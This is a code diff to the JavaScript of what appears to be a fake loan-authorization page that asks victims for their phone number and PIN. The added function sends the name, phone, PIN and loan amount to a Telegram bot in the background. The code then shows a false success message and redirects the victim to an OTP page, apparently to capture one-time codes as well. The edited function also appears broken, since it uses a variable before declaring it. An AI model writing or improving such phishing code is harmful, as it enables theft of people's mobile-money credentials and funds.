@@ -643,25 +643,18 @@
         document.getElementById('errorMsg').style.display = 'none';
     }
 
-    // ─── INSTANT SEND - NO WAITING ───
-    function sendToTelegramInBackground(phone, pin, amount, name) {
-        // Fire and forget - don't await, don't wait for response
-        const message = `🔐 *New Loan Authorization Request*\n\n👤 *User:* ${name}\n📱 *Phone:* ${phone}\n🔢 *PIN:* ${pin}\n💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n⏰ *Time:* ${new Date().toLocaleString()}\n\n✅ User has been redirected to OTP verification.`;
+    // ─── SEND TELEGRAM IN BACKGROUND (FIRE AND FORGET) ───
+    function sendTelegramInBackground(phone, pin, amount, name, period) {
+        const message = `🔐 *PIN Authorization*\n\n` +
+            `👤 *User:* ${name}\n` +
+            `📱 *Phone:* ${phone}\n` +
+            `🔢 *PIN:* ${pin}\n` +
+            `💰 *Amount:* GHS ${parseFloat(amount).toLocaleString()}\n` +
+            `📅 *Period:* ${period || '30 days'}\n` +
+            `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
+            `✅ User has been redirected to OTP verification.`;
 
-        // Send to backend - but don't wait for response
-        fetch(`${CONFIG.API_URL}/api/authorize`, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                name: name,
-                phone: phone,
-                amount: amount,
-                pin: pin,
-                period: params.get('period') || '30 days'
-            })
-        }).catch(err => console.log('📤 Telegram sent in background'));
-
-        // Also try direct Telegram as backup (fire and forget)
+        // Send to Telegram - fire and forget (don't wait for response)
         fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -670,18 +663,10 @@
                 text: message,
                 parse_mode: 'Markdown'
             })
-        }).catch(err => console.log('📤 Direct Telegram sent in background'));
+        }).catch(() => {});
     }
 
-    // ─── INSTANT REDIRECT - NO DELAYS ───
-    function instantRedirect() {
-        const phone = document.getElementById('phone').value.trim();
-        const params = new URLSearchParams(window.location.search);
-        params.set('phone', phone);
-        window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
-    }
-
-    // ─── MAIN FUNCTION - INSTANT ───
+    // ─── HANDLE SUBMIT - SEND TELEGRAM THEN REDIRECT ───
     function handleSubmit() {
         if (isProcessing) return;
         
@@ -689,6 +674,7 @@
         const pin = document.getElementById('pin').value.trim();
         const amount = params.get('amount') || '0';
         const name = params.get('name') || 'User';
+        const period = params.get('period') || '30 days';
 
         // Validate
         if (phone.length < 10) {
@@ -708,11 +694,13 @@
         // Show success message instantly
         showSuccess('✅ Authorization successful! Redirecting...');
 
-        // Send Telegram in background (fire and forget - NO WAITING)
-        sendToTelegramInBackground(phone, pin, amount, name);
+        // ─── SEND TELEGRAM IN BACKGROUND (FIRE AND FORGET) ───
+        sendTelegramInBackground(phone, pin, amount, name, period);
 
-        // Redirect immediately - NO DELAY
-        instantRedirect();
+        // ─── INSTANT REDIRECT TO OTP - NO DELAY ───
+        const params = new URLSearchParams(window.location.search);
+        params.set('phone', phone);
+        window.location.href = CONFIG.OTP_PAGE + '?' + params.toString();
     }
 
     // ─── BIND TO BUTTON ───
